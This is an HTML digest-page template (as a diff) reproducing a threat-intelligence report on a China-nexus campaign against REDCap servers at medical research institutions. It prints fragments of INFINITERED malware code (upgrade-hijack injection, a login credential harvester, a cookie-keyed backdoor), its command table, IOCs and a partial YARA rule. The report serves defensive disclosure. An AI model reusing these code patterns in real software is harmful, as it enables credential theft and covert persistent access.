@@ -1,0 +1,1232 @@
+<!-- article.html テンプレート（生成用） (例: /digest/YYYY/MM/DD/articles/<entry_id>.html)
+     サーバ側（Function）で {{...}} を置換して出力してください。
+-->
+<!doctype html>
+<html lang="ja">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="robots" content="noindex,nofollow" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/assets/icons/favicon-32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/assets/icons/favicon-16.png" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/icons/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="192x192" href="/assets/icons/favicon-192.png" />
+  <title>Public and Private Medical Community Targeted by China-Nexus Threat Actor Pursuing Artificial Intelligence, Cyber, Medical, and National Defense Research | NotifyHub Cybersecurity Daily Report</title>
+  <style>
+    :root{
+      --bg:#0b1020; --panel:#0f1730; --panel2:#121c3a;
+      --text:#e7ecff; --muted:#a9b4df; --line:#22305b;
+      --accent:#7aa2ff; --good:#4ade80; --warn:#fbbf24; --bad:#fb7185;
+      --shadow:0 10px 30px rgba(0,0,0,.35);
+      --radius:18px;
+      color-scheme: dark;
+    }
+    *{box-sizing:border-box}
+    body{
+      margin:0; font-family: ui-sans-serif, system-ui, -apple-system, "Segoe UI", "Noto Sans JP", "Hiragino Kaku Gothic ProN", Meiryo, sans-serif;
+      background: radial-gradient(1000px 700px at 20% -10%, rgba(122,162,255,.25), transparent 60%),
+                  radial-gradient(900px 600px at 90% 10%, rgba(251,113,133,.12), transparent 55%),
+                  var(--bg);
+      color:var(--text);
+    }
+    a{color:inherit}
+    .wrap{max-width:960px; margin:0 auto; padding:22px 18px 44px}
+    .topbar{
+      display:flex; justify-content:space-between; align-items:center; gap:12px;
+      margin-bottom:12px;
+    }
+    .crumb a{
+      text-decoration:none;
+      display:inline-flex; align-items:center; gap:8px;
+      padding:8px 10px;
+      border-radius:12px;
+      border:1px solid rgba(34,48,91,.9);
+      background:rgba(11,16,32,.55);
+      font-size:12px;
+      color:var(--text);
+    }
+    .crumb a:hover{border-color:rgba(122,162,255,.65)}
+    .chip{
+      display:inline-flex; align-items:center; gap:8px;
+      background:rgba(27,38,80,.75);
+      border:1px solid rgba(34,48,91,.9);
+      padding:7px 10px; border-radius:999px;
+      font-size:12px; color:var(--muted);
+      backdrop-filter: blur(10px);
+      white-space:nowrap;
+    }
+    .chip strong{color:var(--text); font-weight:650}
+    .panel{
+      background: linear-gradient(180deg, rgba(15,23,48,.9), rgba(15,23,48,.75));
+      border:1px solid rgba(34,48,91,.9);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow);
+      overflow:hidden;
+    }
+    .head{
+      padding:16px 16px 12px;
+      border-bottom:1px solid rgba(34,48,91,.9);
+      background:rgba(18,28,58,.55);
+    }
+    h1{
+      margin:0;
+      font-size:20px;
+      line-height:1.35;
+      letter-spacing:.15px;
+    }
+    .meta{
+      margin-top:10px;
+      display:flex; gap:10px; flex-wrap:wrap;
+      color:var(--muted);
+      font-size:12px;
+      line-height:1.6;
+    }
+    .meta a{color:var(--muted)}
+    .meta a:hover{color:var(--accent)}
+    .tags{
+      margin-top:12px;
+      display:flex; gap:8px; flex-wrap:wrap;
+    }
+    .tag{
+      font-size:11px;
+      padding:6px 9px;
+      border-radius:999px;
+      background:rgba(27,38,80,.65);
+      border:1px solid rgba(34,48,91,.9);
+      color:var(--muted);
+      white-space:nowrap;
+    }
+    .tag.level-Critical{border-color:rgba(251,113,133,.65); color:#ffd0d7}
+    .tag.level-High{border-color:rgba(251,191,36,.65); color:#ffe9b0}
+    .tag.level-Medium{border-color:rgba(122,162,255,.65); color:#dbe6ff}
+    .tag.level-Low{border-color:rgba(74,222,128,.55); color:#d0ffe2}
+    .tag.level-Info{border-color:rgba(169,180,223,.55); color:rgba(169,180,223,.95)}
+    .body{
+      padding:16px;
+      display:flex;
+      flex-direction:column;
+      gap:14px;
+    }
+    .section{
+      background:rgba(18,28,58,.35);
+      border:1px solid rgba(34,48,91,.75);
+      border-radius:16px;
+      padding:14px;
+    }
+    .section h2{
+      margin:0 0 10px;
+      font-size:14px;
+      letter-spacing:.1px;
+    }
+    .ruleReason{
+      color:var(--muted);
+      font-size:12px;
+      line-height:1.65;
+      white-space:pre-wrap;
+    }
+    .infoSources{
+      color:var(--muted);
+      font-size:12px;
+      line-height:1.5;
+    }
+    .infoSourceRow{
+      margin:0;
+      padding:0;
+    }
+    .infoSourceRow + .infoSourceRow{
+      margin-top:2px;
+    }
+
+    /* --- summary_html styles (OpenAI output uses h4/p/ul/li/strong/code/br) --- */
+    .summary h4{
+      margin:14px 0 8px;
+      font-size:13px;
+      letter-spacing:.1px;
+      padding-left:10px;
+      border-left:3px solid rgba(122,162,255,.65);
+      color: rgba(231,236,255,.95);
+    }
+    .summary p{margin:8px 0; color:rgba(231,236,255,.92); line-height:1.75}
+    .summary ul, .summary ol{margin:8px 0 8px 1.2em; padding:0}
+    .summary li{margin:6px 0; color:rgba(231,236,255,.92); line-height:1.7}
+    .summary strong{
+      color:var(--text);
+      font-weight:750;
+      padding:0 .2em;
+      border-radius:8px;
+      background: linear-gradient(transparent 60%, rgba(122,162,255,.22) 60%);
+    }
+    .summary code{
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace;
+      font-size: 12px;
+      padding: 2px 6px;
+      border-radius: 8px;
+      background: rgba(11,16,32,.6);
+      border: 1px solid rgba(34,48,91,.85);
+      color: rgba(231,236,255,.95);
+      white-space: nowrap;
+    }
+
+    .terms{
+      display:grid;
+      grid-template-columns: 1fr 1fr;
+      gap:10px;
+    }
+    @media (max-width: 860px){
+      .terms{grid-template-columns: 1fr}
+    }
+    .termCard{
+      background:rgba(11,16,32,.45);
+      border:1px solid rgba(34,48,91,.85);
+      border-radius:14px;
+      padding:12px;
+      min-width:0;
+    }
+    .termCard .term{
+      font-weight:700;
+      font-size:13px;
+      margin:0 0 8px;
+      word-break:break-word;
+    }
+    .termCard .exp{
+      margin:0;
+      color:rgba(231,236,255,.9);
+      line-height:1.7;
+      font-size:12px;
+      white-space:pre-wrap;
+    }
+    .subSectionTitle{
+      margin:16px 0 8px;
+      font-size:12px;
+      letter-spacing:.08em;
+      text-transform:uppercase;
+      color:var(--muted);
+    }
+    .deepDive{
+      display:grid;
+      grid-template-columns: 1fr;
+      gap:10px;
+      margin-top:8px;
+    }
+    .deepDiveCard{
+      background:rgba(12,20,38,.6);
+    }
+
+    .footer{
+      margin-top:14px;
+      color:rgba(169,180,223,.75);
+      font-size:12px;
+      line-height:1.7;
+      text-align:center;
+    }
+    .btnRow{display:flex; gap:10px; flex-wrap:wrap; margin-top:10px}
+    .linkbtn{
+      text-decoration:none;
+      display:inline-flex; align-items:center; justify-content:center;
+      padding:8px 10px;
+      border-radius:12px;
+      border:1px solid rgba(34,48,91,.9);
+      background:rgba(11,16,32,.55);
+      font-size:12px;
+      color:var(--text);
+    }
+    .linkbtn:hover{border-color:rgba(122,162,255,.65)}
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="topbar">
+      <div class="crumb">
+        <!-- ../index.html は通常 "../index.html" でOK -->
+        <a href="../index.html">← 日次トップへ戻る</a>
+      </div>
+      <div class="chip">entry_id <strong class="mono">2318a3008e1df6df</strong></div>
+    </div>
+
+    <div class="panel">
+      <div class="head">
+        <h1>Public and Private Medical Community Targeted by China-Nexus Threat Actor Pursuing Artificial Intelligence, Cyber, Medical, and National Defense Research</h1>
+
+        <div class="meta">
+          <span>🗞️ Mandiant</span>
+          <span>🕒 2026-06-15T23:00:00+09:00</span>
+          <span>🔗 <a href="https://cloud.google.com/blog/topics/threat-intelligence/prc-targets-us-medical-research/" target="_blank" rel="noopener noreferrer">原文を開く</a></span>
+        </div>
+
+        <div class="tags">
+          <span class="tag level-Unknown">Impact: Unknown</span>
+          <span class="tag">Unknown</span>
+        </div>
+
+        <div class="btnRow">
+          <a class="linkbtn" href="https://cloud.google.com/blog/topics/threat-intelligence/prc-targets-us-medical-research/" target="_blank" rel="noopener noreferrer">原文リンク</a>
+          <a class="linkbtn" href="https://www.notifyhub.site/digest/2026/06/16/">日次トップ</a>
+        </div>
+      </div>
+
+      <div class="body">
+        
+        <div class="section">
+          <h2>Impact判定理由</h2>
+          <div class="ruleReason"></div>
+        </div>
+        <div class="section summary">
+          <h2>🧾 要約（ChatGPT / gpt-5.5-2026-04-23）</h2>
+          <!-- 注意：summary_html は「許可タグのみ」にサーバ側でバリデーションしてから埋め込む想定 -->
+          <div><p>Written by: Patrick Whitsell, John McGuiness</p>
+
+</div>
+<div><p>Google Threat Intelligence Group (GTIG) has identified a sophisticated campaign attributed to UNC6508, a People's Republic of China (PRC)-nexus threat actor, targeting institutions in the North American academic, medical, and military research community. While remaining undetected for over a year, the threat actor compromised externally facing web applications, deployed bespoke malware, pivoted to sensitive internal systems, and abused enterprise administrative tools for covert data exfiltration. The threat actor had broad collection aspirations, including sensitive defense intelligence related to national security, Indo-Pacific command operations, artificial intelligence, uncrewed vehicle systems, cyber offensive programs, and medical research. </p>
+<p>GTIG disrupted the malicious infrastructure associated with this threat actor. Working with Mandiant Consulting, we notified the affected organizations upon detection and offered our assistance with remediation. We have updated Google Security Operations (SecOps) with relevant intelligence, enabling defenders to identify indicators of compromise (IOCs) within their networks. We encourage all users and customers to follow recommended best practices for third-party Identity Providers (IdP) and ensure 2-Step Verification (2SV) is enabled across all accounts.</p>
+
+Campaign Overview
+<p>The campaign targeted a diverse set of national, state, and private medical entities. These organizations comprise world-renowned clinical providers, premier academic centers, North American military health institutions, professional advocacy groups, and health regulatory bodies. Their research areas span a broad spectrum of modern medicine, from molecular discovery and clinical drug trials to state-level public health policy and military readiness. They employ thousands of people with a combined research budget in the billions of dollars.</p>
+<p>The earliest known compromise occurred in September 2023, after which GTIG observed a consistent operational pattern. The threat actor exploited externally facing REDCap (Research Electronic Data Capture) servers and deployed custom malware named INFINITERED to capture legitimate REDCap login credentials. Then, after remaining undetected for more than a year, UNC6508 used the captured credentials to access the victim’s internal network. The threat actor was also observed using the novel technique of manipulating domain content compliance rules for data exfiltration. Lastly, UNC6508 used sophisticated operations security (OpSec) techniques to conceal and obfuscate their activity. </p>
+<p>GTIG collaborated closely with Mandiant Consulting, the FLARE team, and Workspace Security on this effort to combine our threat intelligence, incident response, and reverse engineering expertise across Google Cloud. This enabled us to develop a complete picture of the attack lifecycle from initial compromise to complete mission. GTIG also extends thanks to the affected organizations for their cooperation and the valuable post-exploitation insights they shared.</p>
+
+Prevention, Detection, and Remediation
+<p>GTIG recommends defenders implement the following security measures, across all Cloud enterprise platforms, to mitigate this threat:</p>
+<ul>
+<li>
+<p><strong>Secure Admin Accounts</strong>: Enforce phishing-resistant 2-Step Verification (2SV) for enterprise administrator accounts, including through third-party Identity Providers.</p>
+</li>
+<li>
+<p><strong>Advanced Protection</strong>: Consider enrolling highly sensitive accounts in our Advanced Protection Program for additional safeguards against malware and phishing attacks.</p>
+</li>
+<li>
+<p><strong>Prevent Cookie Theft</strong>: Enforce Device Bound Session Credentials (DBSC) with CAA for highly sensitive accounts on Windows devices to prevent session hijacking.</p>
+</li>
+<li>
+<p><strong>Monitor Audit Logs</strong>: Enable Audit logs to analyze, monitor, and alert on changes to your data.</p>
+</li>
+<li>
+<p><strong>Control Data</strong>: Define Data Loss Prevention (DLP) rules to block or alert on external sharing of sensitive data.</p>
+</li>
+<li>
+<p><strong>Audit Compliance Rules</strong>: Review Admin audit logs and content compliance rules for unauthorized modifications.</p>
+</li>
+<li>
+<p><strong>SIEM Coverage</strong>: Consider using Google Security Operations (SecOps) and ensure Workspace logs are included in your Security Information and Event Management (SIEM) pipeline.</p>
+</li>
+<li>
+<p><strong>Password Protection</strong>: Use Chrome Enterprise Password Leak Detection to alert when potentially compromised password use is detected.</p>
+</li>
+<li>
+<p><strong>Patch REDCap</strong>: Fully updated REDCap installations to the latest software version and ensure older versions are completely removed.</p>
+</li>
+<li>
+<p><strong>Monitor for INFINITERED</strong>: Scan REDCap servers for the presence of INFINITERED using the provided YARA rule and IOCs.</p>
+</li>
+</ul>
+
+Medical Research University Compromise
+<p>In September 2023, a REDCap server belonging to a North American medical research institution was compromised. Continuing activity was observed through November 2025. During this time period, UNC6508 carried out the following attack chain.</p>
+<ol>
+<li>
+<p>Exploit the REDCap server.</p>
+</li>
+<li>
+<p>After three months, deploy the INFINITERED malware.</p>
+</li>
+<li>
+<p>INFINITERED stealthily records credentials, and persists through upgrades, for more than a year.</p>
+</li>
+<li>
+<p>Pivot to a domain admin account.</p>
+</li>
+<li>
+<p>Add the malicious content compliance rule.</p>
+</li>
+<li>
+<p>Silently “BCC-forward” matched emails to a threat actor-controlled account.</p>
+</li>
+</ol></div>
+<div>
+
+
+
+
+
+
+  
+    <div>
+      <div>
+  
+
+    
+
+
+      
+      
+        
+        
+        
+        
+      
+        
+<p>Figure 1: Campaign attack flow diagram</p>
+      
+    
+
+  
+      </div>
+    </div>
+  
+
+
+
+
+</div>
+<div>
+Initial Access: REDCap Exploitation and INFINITERED
+<p>UNC6508 consistently targets REDCap servers. REDCap is a web-based software platform designed specifically for building and managing online databases and surveys, in compliance with regulations for medical and scientific research. It is a commonly used platform in the North American medical research community.</p>
+<p>GTIG was not able to confirm how UNC6508 initially gained access to the REDCap server. By design, REDCap allows administrators to continue running legacy software side-by-side with the current version. UNC6508 was observed probing for these vulnerable legacy versions on several target organizations’ REDCap systems. This highlights not only the increasing importance of rapidly applying security patches, but also promptly removing older software versions to prevent downgrade attacks.</p>
+<p>Upon establishing a foothold on the REDCap server, UNC6508 performed internal reconnaissance and credential discovery to obtain database and service account credentials. The threat actor also deployed a web shell named "help.php", which maintained persistence and functioned as an uploader in the REDCap application.</p>
+
+INFINITERED Analysis
+<p>Three months after the initial compromise, UNC6508 deployed a custom malware payload tracked as INFINITERED. This malware implements its functionality across three distinct modular components by trojanizing legitimate REDCap system files.</p>
+<ul>
+<li>
+<p>Dropper and Upgrade Interception </p>
+</li>
+<li>
+<p>Credential Harvester</p>
+</li>
+<li>
+<p>Backdoor, with command and control (C2)</p>
+</li>
+</ul>
+<p>GTIG discovered multiple organizations across the US and Canada compromised with INFINITERED. All of these organizations were promptly notified of the compromise upon detection and offered our assistance with remediation.</p></div>
+<div>
+
+
+
+
+
+
+  
+    <div>
+      <div>
+  
+
+    
+
+
+      
+      
+        
+        
+        
+        
+      
+        
+<p>Figure 2: INFINITERED diagram</p>
+      
+    
+
+  
+      </div>
+    </div>
+  
+
+
+
+
+</div>
+<div><h4>Dropper and Upgrade Interception</h4>
+<p>To maintain persistent remote access, INFINITERED injects its code into new REDCap versions by intercepting the upgrade process. This capability is embedded into the legitimate REDCap upgrade system file. INFINITERED performs this code injection following these steps.</p>
+<ol>
+<li>
+<p>Read the current software version, which includes the INFINITERED code. </p>
+</li>
+<li>
+<p>Extract the malicious logic using GUID delimiter b49e334d-9c01-463e-9bc5-00a6920fb66e. </p>
+</li>
+<li>
+<p>Inject backdoor code into the custom hooks configuration file. </p>
+</li>
+<li>
+<p>Inject credential harvester code into the authentication system file.</p>
+</li>
+<li>
+<p>Inject the extracted code from step 2 into the upgrade system file.</p>
+</li>
+</ol>
+<p>In Elastic Beanstalk environments, INFINTERED performs additional steps to ensure persistence in cloud deployments. </p></div>
+<div>
+<code>// b49e334d-9c01-463e-9bc5-00a6920fb66e
+...
+$file_upgrade = $base_path."Upgrade.php"; 
+$file_content_upgrade = $zip-&gt;getFromName($file_upgrade); // new upgrade file content
+$file_content_upgrade_local = file_get_contents(__FILE__); // Contents of the current file 
+...
+if ($file_content_upgrade !== false) {
+    // Base64 GUID delimiter
+    $dummy_marker = base64_decode('YjQ5ZTMzNGQtOWMwMS00NjNlLTliYzUtMDBhNjkyMGZiNjZl');
+    $pattern = "/$dummy_marker(.*?)$dummy_marker/s";
+    if (preg_match($pattern, $file_content_upgrade_local, $matches)) {
+        $extracted_text = $matches[0];
+        $search_content = "// If running on AWS Elastic Beanstalk"; 
+        $upgrade_decode = "// ".$extracted_text."\r\n\t\t".$search_content;
+        $new_content = str_replace($search_content, $upgrade_decode, $file_content_upgrade);
+        $zip-&gt;deleteName($file_upgrade);
+        $zip-&gt;addFromString($file_upgrade, $new_content);
+    }
+}
+$zip-&gt;close();
+...
+// b49e334d-9c01-463e-9bc5-00a6920fb66e</code>
+<p>Code Snippet 1: Intercept upgrades and inject INFINITERED code</p></div>
+<div><h4>Credential Harvester</h4>
+<p>INFINITERED injects a credential harvester into the authentication system file to compromise user accounts. This component of the malware captures usernames and passwords submitted via POST requests during the login process. The credentials are encrypted using the environment’s default encryption routine and hidden inside a local REDCap sessions database table with the string “xc32038474a” prefixed to the Session ID. </p></div>
+<div>
+<code>$currentUTC = gmdate('Y-m-d H:i:s');
+$str = encrypt($currentUTC . '[::]' . $_POST['username'] . '[::]' . $_POST['password']);
+include dirname(__FILE__, 3) . DIRECTORY_SEPARATOR . 'redcap_connect.php';
+$expiration_timestamp = strtotime("+60 days", strtotime($currentUTC));
+$session_id = 'xc32038474a'.substr(bin2hex($currentUTC), -20);
+$session_sql = "INSERT INTO [REDACTED] ([REDACTED],[REDACTED],[REDACTED]) VALUES ('$session_id', '$str', FROM_UNIXTIME($expiration_timestamp))";
+@$rc_connection-&gt;query($session_sql);</code>
+<p>Code Snippet 2: Hide credentials in a legitimate database table</p></div>
+<div><h4>Backdoor</h4>
+<p>INFINITERED also has backdoor functionality it establishes in the custom hooks system file inside the update package, specifically within a function that executes on every REDCap page load. This global hook ensures the backdoor runs on every page load. INFINITERED looks for a specific HTTP Cookie parameter named "REDCAP-TOKEN" and a cookie value starting with a specific plaintext string. If these conditions are present, the malware strips the prefix and decrypts the remaining payload with the environment's default decryption routine.</p></div>
+<div>
+<code>$cookieValue = $_COOKIE['REDCAP-TOKEN'];
+if ($cookieValue) {
+    $magic_flag = '[REDACTED]'; // Cookie prefix
+    ...
+    // Decrypt message if cookie prefix is found
+    $key = '[REDACTED]';
+    $req_data = substr($cookieValue, strlen($magic_flag));
+    $req_data = decrypt($req_data, $key);</code>
+<p>Code Snippet 3: Decrypting commands to INFINITERED</p></div>
+<div><p>If the decrypted payload is empty, the malware acts as a beacon, returning system details such as the OS, PHP version, working directory, and database credentials including the hostname, username, password, and salt. When non-empty, the malware will parse the payload for command tags, which the threat actor can use to execute shell commands, run raw SQL queries, and transfer files.</p>
+<h4>Supported Commands</h4>
+<p>INFINITERED is capable of executing the following commands.</p></div>
+<div><div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+
+
+
+
+<p><strong>Command Tag</strong></p>
+
+
+<p><strong>Description</strong></p>
+
+
+
+
+<p><code>00</code></p>
+
+
+<p><code>Executes arbitrary system commands using shell_exec.</code></p>
+
+
+
+
+<p><code>02</code></p>
+
+
+<p><code>Uploads a file to the server. The payload contains the destination path and file content.</code></p>
+
+
+
+
+<p><code>03</code></p>
+
+
+<p><code>Retrieves stolen credentials stored in the legitimate database table.</code></p>
+
+
+
+
+<p><code>04</code></p>
+
+
+<p><code>Deletes the stolen credential records from the legitimate database table.</code></p>
+
+
+
+
+<p><code>05</code></p>
+
+
+<p><code>Executes arbitrary SQL queries against the database and returns the results.</code></p>
+
+
+
+
+<p><code>ej671a16i7fd8202nu6ltfg5p6x7u</code></p>
+
+
+<p><code>Downloads an arbitrary file from the server. The payload following this tag specifies the full filesystem path of the target file.</code></p>
+
+
+
+
+<p><code>Empty Payload</code></p>
+
+
+<p><code>Beacons system information, database credentials, and configuration details.</code></p>
+
+
+
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<p>Table 1: Supported commands for INFINITERED</p>
+</div></div>
+<div>
+Domain Content Compliance Rule Abuse
+<p>More than a year after the initial compromise, UNC6508 used overlapping credentials, harvested from REDCap, to access an administrator account. This underscores the challenge and importance of securing systems holistically. Defenders should enable 2-Step Verification (2SV) and ensure unique credentials are used across different security domains to mitigate credential replay attacks.</p>
+<p>UNC6508 then leveraged content compliance rules, a legitimate feature present in many cloud-based enterprise productivity suites, to exfiltrate specific email communications. Administrators can create these rules to manage email messages that contain content matching predefined sets of words, phrases, text patterns, or numerical patterns. By default, compliance rules apply to all users in an organizational unit. The use of compliance rules for data exfiltration is a novel technique not previously observed with PRC-nexus threat actors.</p>
+<p>Specifically, UNC6508 created a compliance rule named "Patroit" [sic] that used regular expressions to match on keyword and email address patterns in sent or received emails. Matches were silently BCC-forwarded to a threat actor-controlled Gmail address, BebitaBarefoot774[@]gmail[.]com, providing a covert and continuous stream of exfiltrated data. Upon discovery, GTIG disabled the Gmail account to prevent further data exfiltration.</p></div>
+<div>
+
+
+
+
+
+
+  
+    <div>
+      <div>
+  
+
+    
+
+
+      
+      
+        
+        
+        
+        
+      
+        
+<p>Figure 3: Targeted intelligence collection categories</p>
+      
+    
+
+  
+      </div>
+    </div>
+  
+
+
+
+
+</div>
+<div><p>The patterns used in the “Patroit” compliance rule suggest strategic intelligence collection targeting geo-strategic policy, military strategy, advanced technology, and medical research. The patterns also include professional email addresses and phone numbers for members of organizations in these spaces. Several of the terms applied have spelling errors, suggesting the list was manually maintained. </p>
+<p>This ambitious scope of intelligence collection from UNC6508 may suggest a broader range of targets beyond the identified victims in the medical research community. GTIG assesses these collection priorities are aligned with the strategic interests of the People's Republic of China. </p>
+<p>While most of the terms relate to defense and technology, the terms including medical research facilities, and the specific pathogen “Chikungunya,” stand out from the others. Chikungunya is a viral disease transmitted to humans from mosquitos and was responsible for an outbreak in China's Guangdong province beginning in July 2025.</p>
+
+Operations Security (OpSec)
+<p>GTIG observed UNC6508 use sophisticated and meticulous OpSec techniques to conceal their activities from defenders. </p></div>
+<div>
+
+
+
+
+
+
+  
+    <div>
+      <div>
+  
+
+    
+
+
+      
+      
+        
+        
+        
+        
+      
+        
+<p>Figure 4: UNC6508 operations security techniques</p>
+      
+    
+
+  
+      </div>
+    </div>
+  
+
+
+
+
+</div>
+<div><p>UNC6508 relied heavily on Obfuscation (OBF) networks. This strategy, now frequently employed by PRC-nexus actors, involves routing traffic from offensive operations through a mix of compromised routers, residential proxies, Virtual Private Servers (VPS), and other devices.  </p>
+<p>This operation used exclusively US-based OBF network IP addresses to access both the "BebitaBarefoot774[@]gmail[.]com" account and when replaying legitimate credentials to access the compromised enterprise administrator account. Additional OpSec techniques were also used, such as obtaining the threat actor-controlled Gmail account through a mass creation service and dedicating it exclusively to email data exfiltration.</p>
+<p>By maintaining a high level of OpSec, UNC6508 significantly complicates the efforts of defenders to identify malicious patterns, establish accurate attribution, and map the threat actor’s infrastructure.</p>
+
+Attribution
+<p>GTIG attributes this activity to UNC6508 with high confidence. This assessment is based on infrastructure overlaps between campaigns, the consistent use of the INFINITERED backdoor on REDCap servers, and the specific targeting of medical research and defense sectors. We assess UNC6508 is an espionage motivated threat cluster, with priorities that align with historic PRC state-sponsored espionage trends and intelligence collection requirements.</p>
+
+Indicators of Compromise (IOCs)
+<p>To assist the wider community, we have also included a list of indicators in a GTI Collection for registered users.</p>
+<h4>Network Indicators</h4></div>
+<div><div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+
+
+
+
+<p><strong>Indicator</strong></p>
+
+
+<p><strong>Type</strong></p>
+
+
+<p><strong>Context</strong></p>
+
+
+
+
+<p>BebitaBarefoot774@gmail.com</p>
+
+
+<p>Email</p>
+
+
+<p>Email exfiltration account</p>
+
+
+
+
+<p>23.169.65.49</p>
+
+
+<p>IP</p>
+
+
+<p>Source of admin login (Compromised ASUS router)</p>
+
+
+
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div></div>
+<div><h4>File Indicators</h4></div>
+<div><div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+
+
+
+
+<p><strong>Description</strong></p>
+
+
+<p><strong>SHA256</strong></p>
+
+
+
+
+<p>Persistence (help.php)</p>
+
+
+<p>ba6b73b0ca0dc7f86b3b397893ac32d729fd53f9df20643288f141f29d020af7</p>
+
+
+
+
+<p>Credential Harvester </p>
+
+
+<p>db65c1b9f9e4cb4d729f45ad4b6fcf3e277caf9eb4c875425dec93fd883f9136</p>
+
+
+
+
+<p>Credential Harvester </p>
+
+
+<p>c1ac43d23f89d41eb4ff131678ab562ab2cfed9aa334b13767ef141d303b0e5b</p>
+
+
+
+
+<p>Backdoor </p>
+
+
+<p>8f0158855a656b629ca76ebca565f18bc25563ded34b65d6771632c20edb68ec</p>
+
+
+
+
+<p>Backdoor </p>
+
+
+<p>51a57bfc9ed3eb6451c1c289607814d59e1698c666fb97ac5f694c398f23d045</p>
+
+
+
+
+<p>Dropper </p>
+
+
+<p>4efbef69eb3b09bacff892d6a55778d07c418e7f15eba3cf1245e8cdfd8dda0b</p>
+
+
+
+
+<p>Dropper </p>
+
+
+<p>58bb25777e0aa86bcd2125101e0bca4e8732b03d91bd8d2f205b446a2a8d5c86</p>
+
+
+
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div></div>
+<div><h4>Host Indicators</h4></div>
+<div><div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+
+
+
+
+<p><strong>Indicator</strong></p>
+
+
+<p><strong>Description</strong></p>
+
+
+
+
+<p>b49e334d-9c01-463e-9bc5-00a6920fb66e</p>
+
+
+<p>INFINITERED current software version GUID delimiter</p>
+
+
+
+
+<p>xc32038474a</p>
+
+
+<p>INFINITERED Redcap database session ID prefix</p>
+
+
+
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div></div>
+<div>
+<strong>MITRE ATT&amp;CK Mapping</strong></div>
+<div><div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+<div>
+
+
+
+
+<p><strong>Tactic</strong></p>
+
+
+<p><strong>Technique ID</strong></p>
+
+
+<p><strong>Technique Name</strong></p>
+
+
+<p><strong>Context/Activity</strong></p>
+
+
+
+
+<p><strong>Initial Access</strong></p>
+
+
+<p>T1190</p>
+
+
+<p>Exploit Public-Facing Application</p>
+
+
+<p>Exploitation of REDCap survey management servers.</p>
+
+
+
+
+<p><strong>Persistence</strong></p>
+
+
+<p>T1505.003</p>
+
+
+<p>Server Software Component: Web Shell</p>
+
+
+<p>Deployment of INFINITERED and uploaders.</p>
+
+
+
+ 
+
+<p>T1554</p>
+
+
+<p>Compromise Client Software Binary</p>
+
+
+<p>Modification of REDCap to intercept updates.</p>
+
+
+
+
+<p><strong>Defense Evasion</strong></p>
+
+
+<p>T1027</p>
+
+
+<p>Obfuscated Files or Information</p>
+
+
+<p>Use of Base64 encoding for malicious payloads within PHP files.</p>
+
+
+
+ 
+
+<p>T1090.003</p>
+
+
+<p>Proxy: Multi-hop Proxy</p>
+
+
+<p>Routing traffic through compromised IoT devices (OBF networks).</p>
+
+
+
+ 
+
+<p>T1562.001</p>
+
+
+<p>Impair Defenses: Disable or Modify Tools</p>
+
+
+<p>Creating "silent" BCC rules to avoid user detection.</p>
+
+
+
+ 
+
+<p>T1689</p>
+
+
+<p>Downgrade Attack</p>
+
+
+<p>Exploiting vulnerable legacy versions of REDCap.</p>
+
+
+
+
+<p><strong>Credential Access</strong></p>
+
+
+<p>T1555</p>
+
+
+<p>Credentials from Password Stores</p>
+
+
+<p>Accessing local configuration files. </p>
+
+
+
+ 
+
+<p>T1056.003</p>
+
+
+<p>Input Capture: Web Portal Capture</p>
+
+
+<p>INFINITERED harvesting plaintext credentials from POST login requests.</p>
+
+
+
+
+<p><strong>Collection</strong></p>
+
+
+<p>T1114.003</p>
+
+
+<p>Email Collection: Email Forwarding Rule</p>
+
+
+<p>Use of content compliance rules ("Patroit") for automated exfiltration.</p>
+
+
+
+ 
+
+<p>T1213</p>
+
+
+<p>Data from Information Repositories</p>
+
+
+<p>Searching storage and email for strategic keywords.</p>
+
+
+
+
+<p><strong>Command and Control</strong></p>
+
+
+<p>T1071.001</p>
+
+
+<p>Application Layer Protocol: Web Protocols</p>
+
+
+<p>C2 communication via HTTP Cookie parameters (REDCAP-TOKEN).</p>
+
+
+
+
+<p><strong>Exfiltration</strong></p>
+
+
+<p>T1567</p>
+
+
+<p>Exfiltration Over Web Service</p>
+
+
+<p>Silently forwarding sensitive data to actor-controlled Gmail addresses.</p>
+
+
+
+ 
+
+<p>T1071.001</p>
+
+
+<p>Application Layer Protocol: Web Protocols</p>
+
+
+<p>HTTP response to C2 commands</p>
+
+
+
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div></div>
+<div>
+Detections
+<h4>YARA Rules</h4></div>
+<div>
+<code>rule G_Backdoor_INFINITERED_1 {
+	meta:
+		author = "Google Threat Intelligence Group (GTIG)"
+	strings:
+		$magic_flag = "ej671a16i7fd8202nu6ltfg5p6x7u"
+		$magic_flag_base64 = "ej671a16i7fd8202nu6ltfg5p6x7u" base64
+		$marker = "b49e334d-9c01-463e-9bc5-00a6920fb66e"
